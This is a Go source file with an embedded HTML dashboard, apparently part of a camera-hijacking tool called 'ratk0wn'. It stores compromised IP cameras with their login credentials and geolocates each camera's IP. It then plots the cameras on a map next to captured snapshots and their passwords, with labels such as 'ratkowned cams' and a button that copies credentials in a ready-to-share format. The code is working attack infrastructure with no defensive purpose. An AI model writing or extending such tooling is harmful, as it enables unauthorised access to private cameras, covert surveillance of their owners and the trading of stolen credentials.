package scan

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type webCamRec struct {
	Serial    string  `json:"serial"`
	IP        string  `json:"ip"`
	Login     string  `json:"login"`
	Pass      string  `json:"pass"`
	Model     string  `json:"model"`
	ProxyPort int     `json:"proxy_port,omitempty"`
	Snap      string  `json:"snap,omitempty"`
	Added     int64   `json:"added"`
	Geo       bool    `json:"geo"`
	Lat       float64 `json:"lat,omitempty"`
	Lon       float64 `json:"lon,omitempty"`
	City      string  `json:"city,omitempty"`
	Region    string  `json:"region,omitempty"`
	Country   string  `json:"country,omitempty"`
	Org       string  `json:"org,omitempty"`
}

var (
	camsMu   sync.Mutex
	cams     = map[string]*webCamRec{}
	camOrder []string
)

func WebCamAdd(serial, ip, login, pass, model string) {
	camsMu.Lock()
	if _, ok := cams[serial]; ok {
		camsMu.Unlock()
		return
	}
	rec := &webCamRec{
		Serial: serial, IP: ip, Login: login, Pass: pass,
		Model: model, Added: time.Now().Unix(),
	}
	cams[serial] = rec
	camOrder = append(camOrder, serial)
	camsMu.Unlock()

	if ip != "" {
		go func() {
			if g, ok := geoLookup(ip); ok {
				camsMu.Lock()
				rec.Geo = true
				rec.Lat = g.Lat
				rec.Lon = g.Lon
				rec.City = g.City
				rec.Region = g.Region
				rec.Country = g.Country
				rec.Org = g.Org
				camsMu.Unlock()
			}
		}()
	}
}

func WebCamSetProxy(serial string, port int) {
	camsMu.Lock()
	defer camsMu.Unlock()
	if c, ok := cams[serial]; ok {
		c.ProxyPort = port
	}
}

func WebCamCount() int {
	camsMu.Lock()
	defer camsMu.Unlock()
	return len(cams)
}

func webCamList() []*webCamRec {
	camsMu.Lock()
	defer camsMu.Unlock()
	out := make([]*webCamRec, 0, len(camOrder))
	for _, s := range camOrder {
		if c, ok := cams[s]; ok {
			cp := *c
			out = append(out, &cp)
		}
	}
	return out
}

func webFindSnap(outDir, serial string) string {
	dir := filepath.Join(outDir, "snapshots")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return ""
	}
	var best string
	var bestTime time.Time
	for _, e := range entries {
		n := e.Name()
		if strings.HasPrefix(n, serial) && strings.HasSuffix(strings.ToLower(n), ".jpg") {
			info, ierr := e.Info()
			if ierr != nil {
				continue
			}
			if best == "" || info.ModTime().After(bestTime) {
				best = filepath.Join(dir, n)
				bestTime = info.ModTime()
			}
		}
	}
	return best
}

func StartWebUI(port int, outDir string) error {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return err
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(dashboardHTML))
	})
	mux.HandleFunc("/api/cams", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(webCamList())
	})
	mux.HandleFunc("/api/snap/", func(w http.ResponseWriter, r *http.Request) {
		serial := strings.TrimPrefix(r.URL.Path, "/api/snap/")
		if serial == "" {
			http.NotFound(w, r)
			return
		}
		p := webFindSnap(outDir, serial)
		if p == "" {
			http.NotFound(w, r)
			return
		}
		http.ServeFile(w, r, p)
	})
	mux.HandleFunc("/api/geo/", func(w http.ResponseWriter, r *http.Request) {
		ip := strings.TrimPrefix(r.URL.Path, "/api/geo/")
		if ip == "" {
			http.NotFound(w, r)
			return
		}
		if g, ok := geoLookup(ip); ok {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(g)
			return
		}
		http.NotFound(w, r)
	})
	go http.Serve(ln, mux)
	return nil
}

type geoInfo struct {
	Lat     float64 `json:"latitude"`
	Lon     float64 `json:"longitude"`
	City    string  `json:"city"`
	Region  string  `json:"region"`
	Country string  `json:"country"`
	Org     string  `json:"org"`
}

var (
	geoMu    sync.Mutex
	geoCache = map[string]*geoInfo{}
	geoFail  = map[string]bool{}
	geoCli   = &http.Client{Timeout: 6 * time.Second}
)

func geoLookup(ip string) (*geoInfo, bool) {
	geoMu.Lock()
	if g, ok := geoCache[ip]; ok {
		geoMu.Unlock()
		return g, true
	}
	if geoFail[ip] {
		geoMu.Unlock()
		return nil, false
	}
	geoMu.Unlock()

	var g *geoInfo
	if g1, ok := geoViaIpWho(ip); ok {
		g = g1
	} else if g2, ok := geoViaIpApi(ip); ok {
		g = g2
	} else if g3, ok := geoViaIpapiCo(ip); ok {
		g = g3
	}

	geoMu.Lock()
	defer geoMu.Unlock()
	if g != nil {
		geoCache[ip] = g
		return g, true
	}
	geoFail[ip] = true
	return nil, false
}

func geoViaIpWho(ip string) (*geoInfo, bool) {
	resp, err := geoCli.Get("https://ipwho.is/" + ip)
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()
	var j struct {
		Success bool    `json:"success"`
		Lat     float64 `json:"latitude"`
		Lon     float64 `json:"longitude"`
		City    string  `json:"city"`
		Region  string  `json:"region"`
		Country string  `json:"country"`
		Conn    struct {
			Org string `json:"org"`
		} `json:"connection"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&j); err != nil || !j.Success {
		return nil, false
	}
	return &geoInfo{Lat: j.Lat, Lon: j.Lon, City: j.City, Region: j.Region, Country: j.Country, Org: j.Conn.Org}, true
}

func geoViaIpApi(ip string) (*geoInfo, bool) {
	resp, err := geoCli.Get("http://ip-api.com/json/" + ip + "?fields=status,lat,lon,city,regionName,country,org")
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()
	var j struct {
		Status  string  `json:"status"`
		Lat     float64 `json:"lat"`
		Lon     float64 `json:"lon"`
		City    string  `json:"city"`
		Region  string  `json:"regionName"`
		Country string  `json:"country"`
		Org     string  `json:"org"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&j); err != nil || j.Status != "success" {
		return nil, false
	}
	return &geoInfo{Lat: j.Lat, Lon: j.Lon, City: j.City, Region: j.Region, Country: j.Country, Org: j.Org}, true
}

func geoViaIpapiCo(ip string) (*geoInfo, bool) {
	resp, err := geoCli.Get("https://ipapi.co/" + ip + "/json/")
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()
	var j struct {
		Lat     float64 `json:"latitude"`
		Lon     float64 `json:"longitude"`
		City    string  `json:"city"`
		Region  string  `json:"region"`
		Country string  `json:"country_name"`
		Org     string  `json:"org"`
		Error   bool    `json:"error"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&j); err != nil || j.Error {
		return nil, false
	}
	return &geoInfo{Lat: j.Lat, Lon: j.Lon, City: j.City, Region: j.Region, Country: j.Country, Org: j.Org}, true
}

const dashboardHTML = `<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>ratk0wn dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans+Text:wght@400;500;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
html,body { width:100%; height:100%; overflow:hidden; font-family:'Google Sans Text','Google Sans',system-ui,-apple-system,sans-serif; background:#0a0c10; color:#e8eaed; }
#map { position:absolute; inset:0; background:#0a0c10; }
.leaflet-container { background:#0a0c10; }
.leaflet-tile { filter:invert(1) hue-rotate(180deg) brightness(0.85) contrast(0.9) saturate(0.7); }
#brand { position:absolute; top:14px; left:16px; z-index:1000; font-size:22px; font-weight:700; letter-spacing:.5px; color:#8ab4f8; text-shadow:0 2px 12px rgba(0,0,0,.8); }
#brand small { display:block; font-size:11px; font-weight:400; color:#9aa0a6; letter-spacing:1px; }
#side { position:absolute; top:0; left:0; bottom:0; width:280px; z-index:1000; background:linear-gradient(90deg,rgba(10,12,16,.96) 60%,rgba(10,12,16,.6)); backdrop-filter:blur(6px); padding:60px 14px 14px; overflow-y:auto; }
#side h3 { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:#9aa0a6; margin:10px 4px 8px; }
.cam-item { padding:10px 12px; border-radius:10px; cursor:pointer; margin-bottom:6px; transition:background .18s,transform .18s; }
.cam-item:hover { background:rgba(138,180,248,.08); transform:translateX(3px); }
.cam-item.active { background:rgba(138,180,248,.14); }
.cam-item .s { font-size:13px; font-weight:500; }
.cam-item .m { font-size:11px; color:#9aa0a6; margin-top:2px; }
.cam-item.fresh { animation:popin .5s ease, glow 2s ease 3; }
@keyframes popin { from { transform:scale(.9); opacity:0 } to { transform:scale(1); opacity:1 } }
@keyframes glow { 0%,100% { box-shadow:none } 50% { box-shadow:0 0 18px rgba(129,201,149,.55) } }
#panel { position:absolute; top:0; right:0; bottom:0; width:340px; z-index:1000; background:linear-gradient(270deg,rgba(5,6,8,.95) 55%,rgba(5,6,8,.55)); backdrop-filter:blur(8px); padding:22px 20px; overflow-y:auto; transform:translateX(105%); transition:transform .45s cubic-bezier(.2,.8,.2,1); }
#panel.open { transform:translateX(0); }
#panel .k { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:#9aa0a6; margin:14px 0 3px; }
#panel .v { font-size:14px; font-weight:500; word-break:break-all; }
#panel img { width:100%; border-radius:10px; margin-top:8px; background:#14171c; min-height:120px; }
#panel .cap { font-size:12px; color:#9aa0a6; margin-top:6px; line-height:1.6; word-break:break-all; }
#panel .creds { font-size:13px; margin-top:4px; color:#81c995; word-break:break-all; }
.copybtn { display:inline-block; margin-top:12px; font-size:12px; color:#8ab4f8; text-decoration:none; border:1px solid rgba(138,180,248,.35); padding:8px 14px; border-radius:8px; cursor:pointer; background:transparent; transition:background .18s,color .18s; }
.copybtn:hover { background:rgba(138,180,248,.12); }
.copybtn.done { color:#81c995; border-color:rgba(129,201,149,.5); background:rgba(129,201,149,.08); }
#close { position:absolute; top:12px; right:14px; cursor:pointer; color:#9aa0a6; font-size:20px; }
#toast { position:absolute; top:16px; right:360px; z-index:1100; font-size:12px; color:#81c995; background:rgba(20,30,24,.85); border:1px solid rgba(129,201,149,.3); padding:8px 14px; border-radius:8px; opacity:0; transition:opacity .3s; }
#toast.show { opacity:1; }
.marker-dot { width:14px; height:14px; border-radius:50%; background:#81c995; border:2px solid #0a0c10; box-shadow:0 0 12px rgba(129,201,149,.9); animation:pulse 1.6s infinite; }
@keyframes pulse { 0% { box-shadow:0 0 0 0 rgba(129,201,149,.7) } 70% { box-shadow:0 0 0 16px rgba(129,201,149,0) } 100% { box-shadow:0 0 0 0 rgba(129,201,149,0) } }
#count { position:absolute; bottom:14px; left:296px; z-index:1000; font-size:12px; color:#9aa0a6; background:rgba(10,12,16,.7); padding:6px 12px; border-radius:8px; backdrop-filter:blur(4px); }
.sn-tip { font-family:'Google Sans Text','Google Sans',system-ui,sans-serif !important; background:rgba(10,12,16,.9) !important; border:1px solid rgba(138,180,248,.35) !important; color:#e8eaed !important; font-size:11px; letter-spacing:.6px; border-radius:8px !important; box-shadow:0 6px 18px rgba(0,0,0,.6) !important; padding:4px 10px !important; animation:tipIn .4s ease; }
.sn-tip::before { display:none !important; }
@keyframes tipIn { from { opacity:0; transform:translateY(6px) } to { opacity:1; transform:translateY(0) } }
#splash { position:absolute; inset:0; z-index:5000; background:#0a0c10; display:flex; flex-direction:column; align-items:center; justify-content:center; transition:opacity .8s ease; }
#splash.hide { opacity:0; pointer-events:none; }
#boot { position:absolute; bottom:14vh; width:min(420px,62vw); height:4px; background:rgba(138,180,248,.12); border-radius:3px; overflow:hidden; }
#bootb { height:100%; width:0%; background:#8ab4f8; border-radius:3px; }
#boottxt { position:absolute; bottom:calc(14vh + 18px); font-size:13px; letter-spacing:normal; font-family:'Google Sans Text','Google Sans',system-ui,sans-serif; color:#9aa0a6; }
img.cam { width:100%; border-radius:10px; margin-top:8px; background:#14171c; min-height:120px; }
img.cam.pending { filter:none; opacity:.55; }
</style>
</head>
<body>
<div id="splash"><div id="boottxt">loading</div><div id="boot"><div id="bootb"></div></div></div>
<div id="brand">ratk0wn<small>dashboard</small></div>
<div id="map"></div>
<div id="side"><h3>ratkowned cams</h3><div id="list"></div></div>
<div id="panel"><div id="close">&times;</div><div id="pbody"></div></div>
<div id="toast">new cam ratkowned</div>
<div id="count">0 cams</div>
<script>
const map = L.map('map', {zoomControl:true, attributionControl:false, worldCopyJump:true}).setView([25,10], 2);
L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {maxZoom:19}).addTo(map);
let known = new Set();
let markers = {};
let geoCache = {};
let activeSerial = null;
let zoneCircle = null;
let selectedGeo = null;
let selCtx = null;

let bootP = 0;
let bootCur = 0;
let bootDone = false;
const bootT0 = performance.now();
function bootStep(n){
  bootP = Math.min(100, bootP + n);
}
(function bootLoop(){
  bootCur += (bootP - bootCur) * 0.06;
  document.getElementById('bootb').style.width = bootCur.toFixed(2)+'%';
  if(!bootDone && bootP >= 100 && bootCur > 99){
    bootDone = true;
    setTimeout(()=>{ document.getElementById('splash').classList.add('hide'); }, 350);
  }
  requestAnimationFrame(bootLoop);
})();
document.fonts.ready.then(()=>bootStep(34));
map.whenReady(()=>bootStep(33));
setTimeout(()=>bootStep(33), 500);

async function geo(ip){
  if(!ip) return null;
  if(geoCache[ip]) return geoCache[ip];
  try {
    const r = await fetch('/api/geo/'+ip);
    if(r.ok){
      const j = await r.json();
      if(j && j.latitude !== undefined){
        const g = [j.latitude, j.longitude, j];
        geoCache[ip] = g;
        return g;
      }
    }
  } catch(e){}
  geoCache[ip] = 'fail';
  return null;
}

function camItem(c){
  const div = document.createElement('div');
  div.className = 'cam-item'+(known.size===0?' fresh':'');
  div.dataset.serial = c.serial;
  div.innerHTML = '<div class="s">'+c.serial+'</div><div class="m">'+(c.country||c.model||'')+(c.ip? ' · '+c.ip : '')+'</div>';
  div.onclick = () => select(c);
  return div;
}

function syncList(cams){
  const list = document.getElementById('list');
  const existing = new Set([...list.children].map(e=>e.dataset.serial));
  for(const c of cams){
    if(!existing.has(c.serial)){
      const item = camItem(c);
      if(!known.has(c.serial) && known.size>0){ item.classList.add('fresh'); toast(); }
      list.appendChild(item);
      known.add(c.serial);
    }
    if(c.geo && !markers[c.serial]){
      markers[c.serial] = makeMarker([c.lat, c.lon], c);
      if(activeSerial === c.serial) syncTips();
    }
    if(c.geo && !c.ip) {}
    if(activeSerial === c.serial){ refreshPanel(c); }
  }
  document.getElementById('count').textContent = cams.length+' cams';
}

function snapTag(serial){
  const img = document.createElement('img');
  img.className = 'cam';
  img.alt = serial;
  let tries = 0;
  const attempt = () => {
    tries++;
    img.classList.remove('pending');
    img.src = '/api/snap/'+serial+'?r='+tries;
  };
  img.onerror = () => {
    img.classList.add('pending');
    if(tries < 40) setTimeout(attempt, 2500);
  };
  attempt();
  return img;
}

function refreshPanel(c){
  selectedGeo = c.geo ? {country:c.country, city:c.city} : null;
  selCtx = c;
  const body = document.getElementById('pbody');
  const co = c.geo ? c.lat.toFixed(4)+', '+c.lon.toFixed(4) : 'unavailable';
  const addr = c.geo ? [c.city, c.region, c.country].filter(Boolean).join(', ') : 'unavailable';
  const org = c.geo && c.org ? c.org : '';
  body.innerHTML =
    '<div class="k">s/n</div><div class="v">'+c.serial+'</div>'+
    '<div class="k">ip</div><div class="v">'+(c.ip||'?')+'</div>'+
    '<div class="k">model</div><div class="v">'+(c.model||'?')+'</div>'+
    '<div class="k">coords (approx &plusmn;25km)</div><div class="v">'+co+'</div>'+
    '<div class="k">location (approx)</div><div class="v">'+addr+(org?'<div class="cap">'+org+'</div>':'')+'</div>'+
    '<div class="k">snapshot</div>';
  body.appendChild(snapTag(c.serial));
  body.insertAdjacentHTML('beforeend',
    '<div class="cap">'+c.serial+' · '+c.login+':'+c.pass+'</div>'+
    '<div class="creds">'+c.login+' / '+c.pass+'</div>'+
    '<button class="copybtn" id="copyall">copy all</button>');
  document.getElementById('copyall').onclick = function(){ copyAll(this); };
}

async function select(c){
  activeSerial = c.serial;
  document.querySelectorAll('.cam-item').forEach(e=>e.classList.toggle('active', e.dataset.serial===c.serial));
  refreshPanel(c);
  document.getElementById('panel').classList.add('open');
  if(c.geo){
    let mk = markers[c.serial];
    if(!mk){
      mk = makeMarker([c.lat, c.lon], c);
      markers[c.serial] = mk;
    }
    if(zoneCircle){ map.removeLayer(zoneCircle); }
    zoneCircle = L.circle([c.lat, c.lon], {radius:25000, color:'#8ab4f8', weight:1, fillColor:'#8ab4f8', fillOpacity:0.08, dashArray:'4 6'}).addTo(map);
    map.flyTo([c.lat, c.lon], 11, {duration:2.8, easeLinearity:.2});
  }
  syncTips();
}

function bindTip(mk, serial){
  mk.bindTooltip(serial, {permanent:false, className:'sn-tip', direction:'top', offset:[0,-12]});
}

function syncTips(){
  const z = map.getZoom();
  for(const s in markers){
    const mk = markers[s];
    if(!mk || !mk.getTooltip()) continue;
    if(z >= 11) mk.openTooltip(); else mk.closeTooltip();
  }
}
map.on('zoomend', syncTips);

function makeMarker(g, c){
  const icon = L.divIcon({className:'', html:'<div class="marker-dot"></div>', iconSize:[14,14], iconAnchor:[7,7]});
  const mk = L.marker([g[0], g[1]], {icon:icon}).addTo(map);
  mk.on('click', ()=>select(c));
  bindTip(mk, c.serial);
  return mk;
}

function copyAll(btn){
  if(!selCtx) return;
  const country = selCtx.geo && selCtx.country ? selCtx.country : 'unknown';
  const txt = country+' | s/n '+selCtx.serial+' | '+selCtx.login+':'+selCtx.pass;
  navigator.clipboard.writeText(txt).then(()=>{
    btn.textContent = 'copied ✓';
    btn.classList.add('done');
    setTimeout(()=>{ btn.textContent = 'copy all'; btn.classList.remove('done'); }, 1400);
  }).catch(()=>{
    const ta = document.createElement('textarea');
    ta.value = txt; document.body.appendChild(ta); ta.select();
    document.execCommand('copy'); document.body.removeChild(ta);
    btn.textContent = 'copied ✓';
    btn.classList.add('done');
    setTimeout(()=>{ btn.textContent = 'copy all'; btn.classList.remove('done'); }, 1400);
  });
}

function toast(){
  const t = document.getElementById('toast');
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 2500);
}

document.getElementById('close').onclick = ()=>{ document.getElementById('panel').classList.remove('open'); map.flyTo([25,10], 2, {duration:1.6}); };

async function poll(){
  try {
    const r = await fetch('/api/cams');
    const cams = await r.json();
    syncList(cams);
    for(const s in markers){ if(markers[s] && !cams.find(c=>c.serial===s)){ map.removeLayer(markers[s]); delete markers[s]; } }
  } catch(e){}
  setTimeout(poll, 1500);
}
poll();
</script>
</body>
</html>`
